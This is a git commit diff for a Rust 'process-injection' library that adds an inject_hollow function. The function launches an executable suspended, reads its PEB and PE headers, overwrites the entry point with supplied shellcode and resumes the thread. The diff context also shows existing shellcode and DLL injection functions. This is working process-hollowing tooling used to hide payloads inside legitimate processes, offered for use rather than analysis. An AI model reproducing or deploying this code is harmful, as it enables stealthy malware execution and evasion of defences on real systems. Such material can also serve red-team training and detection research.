cdc380c194c18b52f75d673b1b4381ebe9b244ca
ggoessel <guillaume.goessel@aon.co.uk>
2023-03-08 05:13:49 -0800

    Add process hollowing injection

--- process-injection/src/lib.rs
+++ process-injection/src/lib.rs
@@ -1,15 +1,20 @@
 use core::ffi::c_void;
+use std::mem::{size_of, MaybeUninit};
 use std::ptr;
 use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};
 use windows_sys::Win32::System::{
-    Diagnostics::Debug::WriteProcessMemory,
+    Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory, IMAGE_NT_HEADERS64},
     LibraryLoader::{GetModuleHandleA, GetProcAddress},
     Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
     ProcessStatus::{K32EnumProcesses, K32GetModuleBaseNameW},
-    Threading::{CreateRemoteThread, OpenProcess, LPTHREAD_START_ROUTINE, PROCESS_ALL_ACCESS},
+    SystemServices::IMAGE_DOS_HEADER,
+    Threading::{
+        CreateProcessA, CreateRemoteThread, NtQueryInformationProcess, OpenProcess, ResumeThread,
+        CREATE_SUSPENDED, LPTHREAD_START_ROUTINE, PROCESS_ALL_ACCESS, PROCESS_BASIC_INFORMATION,
+        PROCESS_INFORMATION, STARTUPINFOA,
+    },
 };
 pub fn inject_shellcode(process_name: String, buf: Vec<u8>) -> Result<HANDLE, &'static str> {
-    
     let addr: *mut c_void;
 
     let h_process: HANDLE = find_process(process_name)?;
@@ -56,7 +61,6 @@ pub fn inject_shellcode(process_name: String, buf: Vec<u8>) -> Result<HANDLE, &'
 }
 
 pub fn inject_dll(process_name: String, file_path: &str) -> Result<HANDLE, &'static str> {
-    
     let addr: *mut c_void;
 
     //    1. Find process
@@ -131,6 +135,134 @@ pub fn inject_dll(process_name: String, file_path: &str) -> Result<HANDLE, &'sta
         Ok(remote_thread_handle)
     }
     //    Ok(h_process)
+}
+
+pub fn inject_hollow(exe_path: String, buf: Vec<u8>) -> Result<(), &'static str> {
+    //    1. Start a process in suspended state
+    let startup_info: STARTUPINFOA = unsafe { MaybeUninit::<STARTUPINFOA>::zeroed().assume_init() };
+    let mut process_info: PROCESS_INFORMATION =
+        unsafe { MaybeUninit::<PROCESS_INFORMATION>::zeroed().assume_init() };
+    let create_process = unsafe {
+        CreateProcessA(
+            ptr::null(),
+            exe_path.as_ptr() as *mut u8,
+            ptr::null(),
+            ptr::null(),
+            0,
+            CREATE_SUSPENDED,
+            ptr::null(),
+            ptr::null(),
+            &startup_info,
+            &mut process_info,
+        )
+    };
+    if create_process == 0 {
+        return Err("Could not create process");
+    }
+    println!("Created process: {:?}", process_info.hProcess);
+
+    // 2. Locate PEB in created process
+    let mut nt_process_info = MaybeUninit::<PROCESS_BASIC_INFORMATION>::zeroed();
+    let mut return_len: u32 = 0;
+    let nt_process_info_result = unsafe {
+        NtQueryInformationProcess(
+            process_info.hProcess,
+            0,
+            nt_process_info.as_mut_ptr() as *mut c_void,
+            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
+            &mut return_len,
+        )
+    };
+    if nt_process_info_result != 0 {
+        return Err("Couldn't run NtQueryInformationProcess");
+    }
+    let nt_process_info_safe = unsafe { nt_process_info.assume_init() };
+    // 3. Calculate image base position
+    let ptr_to_image_base = nt_process_info_safe.PebBaseAddress as u64 + 0x10;
+    // 4. Use that to read the process memory
+    let mut image_base_buffer = [0; size_of::<&u8>()];
+    let mut bytes_read: usize = 0;
+    let memory = unsafe {
+        ReadProcessMemory(
+            process_info.hProcess,
+            ptr_to_image_base as *mut c_void,
+            image_base_buffer.as_mut_ptr() as *mut c_void,
+            image_base_buffer.len(),
+            &mut bytes_read,
+        )
+    };
+    if memory == 0 || bytes_read == 0 {
+        return Err("Couldn't get process memory");
+    }
+    let target_base = usize::from_ne_bytes(image_base_buffer);
+    // 5. extract EntryPoint from PE header at target_base
+    let mut pe_header = MaybeUninit::<IMAGE_DOS_HEADER>::zeroed();
+    let mut bytes_read: usize = 0;
+    let memory = unsafe {
+        ReadProcessMemory(
+            process_info.hProcess,
+            target_base as *mut c_void,
+            pe_header.as_mut_ptr() as *mut c_void,
+            size_of::<IMAGE_DOS_HEADER>(),
+            &mut bytes_read,
+        )
+    };
+    let pe_header_safe = unsafe { pe_header.assume_init() };
+    if memory == 0 || bytes_read == 0 {
+        return Err("Couldn't read PE header");
+    }
+    // 6. Use EntryPoint offset to read memory
+    let mut entrypoint = MaybeUninit::<IMAGE_NT_HEADERS64>::zeroed();
+    let entrypoint_ptr_addr = target_base + (pe_header_safe.e_lfanew as usize);
+    let mut bytes_read: usize = 0;
+    let memory = unsafe {
+        ReadProcessMemory(
+            process_info.hProcess,
+            entrypoint_ptr_addr as *mut c_void,
+            entrypoint.as_mut_ptr() as *mut c_void,
+            size_of::<IMAGE_NT_HEADERS64>(),
+            &mut bytes_read,
+        )
+    };
+    let entrypoint_safe = unsafe { entrypoint.assume_init() };
+    if memory == 0 || bytes_read == 0 {
+        return Err("Couldn't read Image NT header");
+    }
+    println!(
+        "Entrypoint: {:#x}",
+        entrypoint_safe.OptionalHeader.AddressOfEntryPoint
+    );
+    // 7. Write shellcode to the entrypoint
+    let mut nb_written_bytes = 0;
+    let shellcode = buf.as_ptr() as *const c_void;
+    let entrypoint_addr =
+        target_base + (entrypoint_safe.OptionalHeader.AddressOfEntryPoint as usize);
+    if unsafe {
+        WriteProcessMemory(
+            process_info.hProcess,
+            entrypoint_addr as *mut c_void,
+            shellcode,
+            buf.len(),
+            &mut nb_written_bytes,
+        )
+    } == 0
+    {
+        println!("{}", nb_written_bytes);
+        return Err("Couldn't write shellcode");
+    }
+
+    // 8. Resume the thread
+    if unsafe { ResumeThread(process_info.hThread) } == 0 {
+        return Err("Couldn't resume thread");
+    }
+
+    // Success
+    unsafe {
+        CloseHandle(process_info.hProcess);
+        CloseHandle(process_info.hThread);
+    }
+
+    Ok(())
 }
 
 pub fn find_process(process_name: String) -> Result<HANDLE, &'static str> {
